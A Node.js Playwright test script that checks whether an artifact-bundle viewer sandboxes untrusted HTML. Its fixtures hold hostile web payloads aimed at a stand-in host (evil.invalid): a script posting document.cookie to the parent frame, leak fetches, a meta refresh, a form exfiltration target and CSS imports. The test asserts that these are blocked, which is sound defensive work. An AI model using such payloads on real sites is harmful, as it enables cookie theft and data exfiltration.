#!/usr/bin/env node
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { mkdtemp, mkdir, writeFile, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createHash } from "node:crypto";
import { build } from "esbuild";
import { chromium } from "playwright";
import { canonicalJson } from "../packages/protocol/dist/index.js";
import { startServer } from "../packages/server/dist/index.js";
const directory = await mkdtemp(join(tmpdir(), "agentlive-bundle-browser-"));
const output = resolve("probe-results/bundle-preview");
await mkdir(output, { recursive: true });
let server, harness, browser;
try {
  const sources = [
    [
      "index.html",
      "text/html",
      '<html><head id="hostile"><script type="module" src="main.js"></script><script type="module">import {label} from "./leaf.js";document.querySelector("#counter").dataset.inline=label;</script><script src="classic.js" defer></script><link rel="stylesheet" href="style.css"><meta http-equiv="refresh" content="0;url=https://evil.invalid/leak"></head><body><button id="counter" onclick="this.textContent=Number(this.textContent)+1">0</button><h1 class="hero" onclick="fetch(\'/leak\')">Captured bundle</h1><picture><source media="(min-width: 1px)" srcset="image.png 1x, https://evil.invalid/candidate 2x"><img srcset="image.png 1x" src="image.png" onerror="fetch(\'/leak\')"></picture><img id="jpeg" src="image.jpg"><img id="webp" src="image.webp"><img src="https://evil.invalid/track"><script>globalThis.__artifactRan=true;fetch("/leak");parent.postMessage({secret:document.cookie},"*");</script><iframe src="/leak"></iframe><form action="https://evil.invalid/send"><input name="secret"><button>Submit</button></form><a href="https://evil.invalid/navigate">External link</a></body></html>',
    ],
    [
      "main.js",
      "text/javascript",
      'import {value} from "./cycle-a.js"; import {label} from "./export.js"; const {suffix}=await import("./dynamic.js"); document.querySelector("#counter").dataset.module=value()+label+suffix;',
    ],
    [
      "cycle-a.js",
      "text/javascript",
      'import {other} from "./cycle-b.js"; export const base="cycle"; export function value(){return other();}',
    ],
    [
      "cycle-b.js",
      "text/javascript",
      'import {base} from "./cycle-a.js"; export function other(){return base;}',
    ],
    ["export.js", "text/javascript", 'export {label} from "./leaf.js";'],
    ["leaf.js", "text/javascript", 'export const label="-export";'],
    ["dynamic.js", "text/javascript", 'export const suffix="-dynamic";'],
    [
      "classic.js",
      "text/javascript",
      'document.querySelector("#counter").dataset.external="ready";',
    ],
    [
      "style.css",
      "text/css",
      '@import "nested.css"; @import "https://evil.invalid/styles"; .hero { color: rgb(12,34,56); } body {background-image:url(https://evil.invalid/background)}',
    ],
    ["nested.css", "text/css", ".hero { border: 3px solid rgb(1,2,3); }"],
    [
      "image.png",
      "image/png",
      Buffer.from(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aDFkAAAAASUVORK5CYII=",
        "base64",
      ),
    ],
  ];
  sources.push([
    "image.jpg",
    "image/jpeg",
    await readFile(
      new URL("../tests/fixtures/images/pixel.jpg", import.meta.url),
    ),
  ]);
  sources.push([
    "image.webp",
    "image/webp",
    await readFile(
      new URL("../tests/fixtures/images/pixel.webp", import.meta.url),
    ),
  ]);
  const blobs = {},
    files = [];
  for (const [path, mediaType, input] of sources) {
    const bytes = Buffer.from(input);
    const hash = createHash("sha256").update(bytes).digest("hex");
    blobs[hash] = bytes.toString("base64");
    files.push({ path, mediaType, hash, byteSize: bytes.length });
  }
  const manifest = {
    format: "agentlive.artifact-bundle",
    version: 1,
    entrypoint: "index.html",
    files,
    unavailable: [
      { from: "index.html", target: "missing/file", reason: "outside-scope" },
    ],
  };
  const envelope = {
    manifest,
    manifestHash: createHash("sha256")
      .update(canonicalJson(manifest))
      .digest("hex"),
    blobs,
  };
  const bundleBytes = Buffer.from(canonicalJson(envelope));
  const attachment = {
    artifactId: "bundle",
    version: 1,
    hash: createHash("sha256").update(bundleBytes).digest("hex"),
    filename: "bundle.json",
    mediaType: "application/vnd.agentlive.artifact-bundle+json",
    byteSize: bundleBytes.length,
  };
  const standaloneBytes = Buffer.from(
    '<style>h1{color:rgb(45,67,89)}</style><h1>Standalone HTML</h1><script>fetch("https://evil.invalid")</script><img src="missing.png">',
  );
  const standalone = {
    ...attachment,
    artifactId: "html",
    filename: "page.html",
    mediaType: "text/html",
    hash: createHash("sha256").update(standaloneBytes).digest("hex"),
    byteSize: standaloneBytes.length,
  };
  let downloads = 0,
    corruptDownload = false;
  const compiled = await build({
    stdin: {
      contents: `import React,{useState} from "./apps/web/node_modules/react/index.js";import{createRoot}from"./apps/web/node_modules/react-dom/client.js";import{AttachmentViewer}from"./apps/web/src/attachment-viewer.tsx";const descriptor=${JSON.stringify(attachment)},standalone=${JSON.stringify(standalone)};function App(){const[open,setOpen]=useState(false);return React.createElement(React.Fragment,null,React.createElement("button",{onClick:()=>setOpen("bundle")},"Open bundle"),React.createElement("button",{onClick:()=>setOpen("html")},"Open HTML"),open&&React.createElement(AttachmentViewer,{attachment:open==="html"?standalone:descriptor,streamId:"preview",credential:"synthetic-viewer-credential",onClose:()=>setOpen(false)}));}createRoot(document.getElementById("root")).render(React.createElement(App));`,
      resolveDir: process.cwd(),
      loader: "js",
    },
    bundle: true,
    write: false,
    platform: "browser",
    format: "esm",
    target: "es2023",
    define: { "process.env.NODE_ENV": '"production"' },
  });
  server = await startServer({
    directory: join(directory, "server"),
    ownerSecret: "a".repeat(64),
    port: 0,
  });
  const headers = (await fetch(server.url)).headers;
  const attempted = [];
  harness = createServer(async (req, res) => {
    try {
      if (req.url === "/") {
        res.writeHead(200, {
          "content-type": "text/html",
          "content-security-policy": headers.get("content-security-policy"),
        });
        res.end(
          '<!doctype html><html><head><link rel="stylesheet" href="/app.css"><script type="module" src="/harness.js"></script></head><body><main id="root"></main></body></html>',
        );
        return;
      }
      if (
        req.url === `/api/v1/streams/preview/attachments/${standalone.hash}`
      ) {
        if (
          req.headers.authorization !== "Bearer synthetic-viewer-credential"
        ) {
          res.writeHead(403).end();
          return;
        }
        res.writeHead(200, { "content-type": "application/octet-stream" });
        res.end(standaloneBytes);
        return;
      }
      if (
        req.url === `/api/v1/streams/preview/attachments/${attachment.hash}`
      ) {
        if (
          req.headers.authorization !== "Bearer synthetic-viewer-credential"
        ) {
          res.writeHead(403).end();
          return;
        }
        downloads++;
        res.writeHead(200, {
          "content-type": "application/octet-stream",
          "content-length": bundleBytes.length,
        });
        const responseBytes = Buffer.from(bundleBytes);
        if (corruptDownload) responseBytes[0] ^= 1;
        res.end(responseBytes);
        return;
      }
      if (req.url === "/harness.js") {
        res.writeHead(200, { "content-type": "text/javascript" });
        res.end(compiled.outputFiles[0].contents);
        return;
      }
      if (
        ![
          "/artifact-preview",
          "/artifact-preview.js",
          "/artifact-interactive",
          "/artifact-interactive.js",
          "/app.css",
          "/favicon.ico",
        ].includes(req.url)
      )
        attempted.push(req.url);
      const response = await fetch(server.url + req.url);
      res.writeHead(response.status, Object.fromEntries(response.headers));
      res.end(Buffer.from(await response.arrayBuffer()));
    } catch {
      res.writeHead(500).end();
    }
  });
  await new Promise((resolve) => harness.listen(0, "127.0.0.1", resolve));
  const origin = `http://127.0.0.1:${harness.address().port}`;
  browser = await chromium.launch({ channel: "chrome", headless: true });
  const page = await browser.newPage({
    viewport: { width: 1000, height: 850 },
  });
  const external = [];
  await page.route("**/*", (route) => {
    const url = route.request().url();
    if (url.startsWith(origin) || url.startsWith("data:"))
      return route.continue();
    external.push(url);
    return route.abort();
  });
  await page.goto(origin);
  await page.getByRole("button", { name: "Open bundle" }).click();
  await page.getByRole("dialog", { name: "Attachment inspector" }).waitFor();
  const preview = page
    .frameLocator('iframe[title="Static preview of index.html"]')
    .frameLocator('iframe[title="Static artifact document"]');
  await preview.locator(".hero").waitFor();
  assert.equal(
    await preview
      .locator(".hero")
      .evaluate((node) => getComputedStyle(node).color),
    "rgb(12, 34, 56)",
  );
  assert.equal(
    await preview
      .locator(".hero")
      .evaluate((node) => getComputedStyle(node).borderTopWidth),
    "3px",
  );
  assert.equal(
    await preview
      .locator("img")
      .first()
      .evaluate((node) => node.complete && node.naturalWidth),
    1,
  );
  assert.equal(
    await preview
      .locator("script,iframe,input,meta[http-equiv=refresh]")
      .count(),
    0,
  );
  assert.equal(
    await preview
      .locator("#jpeg")
      .evaluate((node) => node.complete && node.naturalWidth),
    1,
  );
  assert.equal(
    await preview
      .locator("#webp")
      .evaluate((node) => node.complete && node.naturalWidth),
    2,
  );
  assert.equal(await preview.locator("picture source").count(), 1);
  assert.ok(
    (await preview.locator("picture source").getAttribute("srcset")).startsWith(
      "data:image/png;base64,",
    ),
  );
  assert.equal(
    await preview
      .locator("picture img")
      .evaluate((node) => node.currentSrc.startsWith("data:image/png;base64,")),
    true,
  );
  assert.equal(
    await preview
      .locator("button")
      .evaluateAll((nodes) => nodes.every((node) => node.disabled)),
    true,
  );
  assert.equal(await preview.locator("a").getAttribute("href"), null);
  assert.equal(
    await preview
      .locator("body")
      .evaluate(() => typeof globalThis.__artifactRan),
    "undefined",
  );
  await page.getByText("Unavailable references (1)", { exact: true }).click();
  await page
    .getByText("index.html → missing/file: outside-scope", { exact: true })
    .waitFor();
  await page.screenshot({ path: join(output, "desktop.png"), fullPage: true });
  await page.getByLabel("Captured file").selectOption("style.css");
  await page.getByText("Captured source", { exact: true }).click();
  assert.ok((await page.locator("pre").textContent()).includes("evil.invalid"));
  const downloading = page.waitForEvent("download");
  await page.getByText("Download selected file", { exact: true }).click();
  const download = await downloading;
  const saved = join(directory, "download.css");
  await download.saveAs(saved);
  assert.equal(
    await readFile(saved, "utf8"),
    sources.find(([path]) => path === "style.css")[2],
  );
  await page.getByLabel("Captured file").selectOption("index.html");
  await preview.locator(".hero").waitFor();
  await page.setViewportSize({ width: 390, height: 844 });
  await page.screenshot({ path: join(output, "mobile.png"), fullPage: true });
  await page.getByRole("button", { name: "Close attachment" }).click();
  assert.equal(await page.locator("iframe").count(), 0);
  await page.getByRole("button", { name: "Open bundle" }).click();
  await preview.locator(".hero").waitFor();
  assert.equal(
    await page.getByLabel("Captured file").inputValue(),
    "index.html",
  );
  await page.keyboard.press("Escape");
  await page.getByRole("dialog").waitFor({ state: "detached" });
  assert.equal(downloads, 2);
  corruptDownload = true;
  await page.getByRole("button", { name: "Open bundle" }).click();
  await page
    .getByRole("alert")
    .filter({ hasText: "integrity check failed" })
    .waitFor();
  assert.equal(await page.locator("iframe").count(), 0);
  assert.equal(
    await page.getByText("Download verified file", { exact: true }).count(),
    0,
  );
  await page.getByRole("button", { name: "Close attachment" }).click();
  corruptDownload = false;
  await page.getByRole("button", { name: "Open bundle" }).click();
  await preview.locator(".hero").waitFor();
  await page.getByRole("button", { name: "Close attachment" }).click();
  assert.equal(downloads, 4);

  await page.getByRole("button", { name: "Open HTML" }).click();
  const htmlFrame = page
    .frameLocator('iframe[title="Static preview of attachment.html"]')
    .frameLocator('iframe[title="Static artifact document"]');
  await htmlFrame.locator("h1").waitFor();
  assert.equal(
    await htmlFrame
      .locator("h1")
      .evaluate((node) => getComputedStyle(node).color),
    "rgb(45, 67, 89)",
  );
  assert.equal(await htmlFrame.locator("script").count(), 0);
  await page.getByRole("button", { name: "Run interactive preview" }).click();
  const standaloneInteractive = page
    .frameLocator('iframe[title="Interactive preview of attachment.html"]')
    .frameLocator('iframe[title="Interactive artifact document"]');
  await standaloneInteractive.locator("h1").waitFor();
  assert.equal(
    await standaloneInteractive.locator("h1").textContent(),
    "Standalone HTML",
  );
  await page.getByRole("button", { name: "Stop interactive preview" }).click();
  await page.getByRole("button", { name: "Close attachment" }).click();
  await page.getByRole("button", { name: "Open bundle" }).click();
  await page.getByRole("button", { name: "Run interactive preview" }).click();
  const interactive = page
    .frameLocator('iframe[title="Interactive preview of index.html"]')
    .frameLocator('iframe[title="Interactive artifact document"]');
  await interactive.locator("#counter").click();
  assert.equal(await interactive.locator("#counter").textContent(), "1");
  assert.equal(
    await interactive.locator("#counter").getAttribute("data-external"),
    "ready",
  );
  assert.equal(
    await interactive.locator("body").evaluate(() => globalThis.__artifactRan),
    true,
  );
  assert.equal(
    await interactive.locator("body").evaluate(() => {
      try {
        return parent.document.title;
      } catch {
        return "isolated";
      }
    }),
    "isolated",
  );
  await page
    .getByRole("button", { name: "Stop interactive preview" })
    .scrollIntoViewIfNeeded();
  await page.screenshot({
    path: join(output, "interactive-mobile.png"),
    fullPage: true,
  });
  await interactive
    .locator('#counter[data-module="cycle-export-dynamic"]')
    .waitFor();
  assert.equal(
    await interactive.locator("#counter").getAttribute("data-inline"),
    "-export",
  );
  // Child self-navigation is constrained by the trusted wrapper's frame policy.
  await interactive.locator("body").evaluate(() => {
    location.href = "https://evil.invalid/navigation";
  });
  await page.waitForTimeout(100);
  assert.deepEqual(external, []);
  await page.getByRole("button", { name: "Stop interactive preview" }).click();
  await page.getByRole("button", { name: "Run interactive preview" }).click();
  await interactive.locator("#counter").waitFor();
  await interactive.locator("body").evaluate(() => {
    location.href = "/api/v1/leak";
  });
  await page.waitForTimeout(100);
  assert.deepEqual(attempted, []);
  await page.getByRole("button", { name: "Stop interactive preview" }).click();
  assert.equal(
    await page
      .locator('iframe[title="Interactive preview of index.html"]')
      .count(),
    0,
  );
  assert.deepEqual(attempted, []);
  assert.deepEqual(external, []);
  const report = {
    success: true,
    checks: [
      "attachment-dialog-authorized-download",
      "dialog-close-reopen-escape",
      "corrupt-download-rejected-and-retry",
      "standalone-html-attachment",
      "explicit-interactive-counter-and-stop",
      "captured-modules-cycles-reexports-dynamic-import",
      "interactive-opaque-origin-and-navigation-isolation",
      "rendered-html",
      "stylesheet-import",
      "png-preview",
      "jpeg-preview",
      "webp-preview",
      "responsive-picture-preview",
      "script-form-navigation-isolation",
      "no-external-or-service-requests",
      "missing-references",
      "verified-source-download",
      "selection-and-mobile-viewport",
    ],
    screenshots: ["desktop.png", "mobile.png", "interactive-mobile.png"],
  };
  await writeFile(join(output, "report.json"), JSON.stringify(report, null, 2));
  console.log(JSON.stringify(report));
} finally {
  await browser?.close();
  if (harness) {
    harness.closeAllConnections();
    await new Promise((resolve) => harness.close(resolve));
  }
  await server?.close();
  await rm(directory, { recursive: true, force: true });
}
